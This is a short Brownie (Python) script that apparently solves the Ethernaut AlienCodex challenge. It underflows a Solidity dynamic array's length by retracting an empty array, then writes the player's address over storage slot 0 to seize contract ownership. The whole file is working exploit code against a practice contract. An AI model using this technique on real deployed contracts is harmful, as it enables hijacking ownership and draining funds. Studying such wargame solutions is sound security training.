from brownie import config, accounts, AlienCodex, web3

InstanceAddress = "0xEE5335E55b0eaA2E1f485A766A0a989d4c99834E"
player = accounts.add(config["wallets"]["from_key"]) 
alienCodex = AlienCodex.at(InstanceAddress)

array_start = web3.toInt(web3.solidityKeccak(["uint256"], [1]))

def main():
    print(f"Current owner of the Codex is :{alienCodex.owner()}")

    tx = alienCodex.make_contact({"from": player})
    tx.wait(1)
    slot_1 = web3.eth.get_storage_at(InstanceAddress, 0)
    slot_1 = web3.toHex(slot_1)
    print(f"slot[0]: {slot_1}")
    owner_slot = 2 ** 256 - array_start
    print(f"The owner slot is : {owner_slot}")

    print(f"Array length: {web3.toInt(web3.eth.get_storage_at(InstanceAddress, 1))}")
    tx = alienCodex.retract({"from":player})
    tx.wait(1)
    print(f"Array length: {web3.toInt(web3.eth.get_storage_at(InstanceAddress, 1))}")

    tx = alienCodex.revise(owner_slot, player.address, {"from": player})
    tx.wait(1)
    print(f"Owner is :{alienCodex.owner()}")